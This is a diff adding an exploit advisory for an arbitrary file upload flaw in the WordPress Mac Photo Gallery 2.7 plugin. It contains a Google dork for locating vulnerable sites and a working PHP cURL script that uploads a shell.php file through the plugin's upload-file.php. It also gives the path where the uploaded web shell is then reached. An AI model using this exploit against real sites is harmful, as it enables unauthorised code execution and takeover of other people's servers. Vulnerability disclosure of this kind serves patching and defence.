@@ -1,0 +1,33 @@
+###########################################################
+#
+# Exploit Title: Wordpress Mac Photo Gallery 2.7 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/mac-dock-gallery/
+# Date: 11/06/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage:  http://www.apptha.com
+# Software Link: http://downloads.wordpress.org/plugin/mac-dock-gallery.2.7.zip
+# Version: 2.7
+#
+###########################################################
+
+Vuln page : http://mysite.com/wp-content/plugins/mac-dock-gallery/upload-file.php
+
+exploit :
+
+<?php
+$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\shell.php";
+$c = curl_init("http://127.0.0.1/wordpress/wp-content/plugins/mac-dock-gallery/upload-file.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('uploadfile'=>"@$u",
+'albumId'=>"1",
+'mode'=>"image"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+shell access : http://mysite.com/wp-content/uploads/mac-dock-gallery/shell.php
+
+#####################################################################
